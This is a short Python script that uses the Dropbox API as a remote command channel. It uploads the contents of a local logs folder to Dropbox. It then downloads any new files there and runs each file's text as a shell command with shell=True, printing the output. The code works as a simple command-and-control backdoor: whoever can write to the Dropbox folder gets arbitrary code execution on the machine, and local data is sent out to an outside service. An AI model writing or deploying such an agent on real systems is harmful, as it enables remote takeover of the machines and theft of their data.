import os
import subprocess
import dropbox
import dropbox.files

with open("TOKEN.txt", "r") as f:
    TOKEN = f.read()
    

dbx = dropbox.Dropbox(TOKEN)

def upload_logs():
    for file in os.listdir("logs"):
        with open(os.path.join("logs", file), "rb") as f:
            data = f.read()
            print(data)
            dbx.files_upload(data, f"/{file}")

def download_files():
    for entry in dbx.files_list_folder("").entries:
        dbx.files_download_to_file(os.path.join("local_files", entry.name), f"/{entry.name}")

def download_new():
    for entry in dbx.files_list_folder("").entries:
        if not os.path.exists(os.path.join("local_files", entry.name)):
            dbx.files_download_to_file(os.path.join("local_files", entry.name), f"/{entry.name}")
            print("executed")

def exec_new():
    for entry in dbx.files_list_folder("").entries:
        if not os.path.exists(os.path.join("local_files", entry.name)):
            filepath = f"./local_files/{entry.name}"
            
            dbx.files_download_to_file(filepath, f"/{entry.name}")
            
            with open(filepath, 'r') as file:
                command = file.read().strip()
            
            print(command)
            try:
                result = subprocess.run(command, capture_output=True, text=True, shell=True)
                print('stdout:', result.stdout)
                if result.stderr:
                    print('stderr:', result.stderr)
            except Exception as e:
                print(f"Error executing command from {entry.name}: {e}")
            
            
            
exec_new()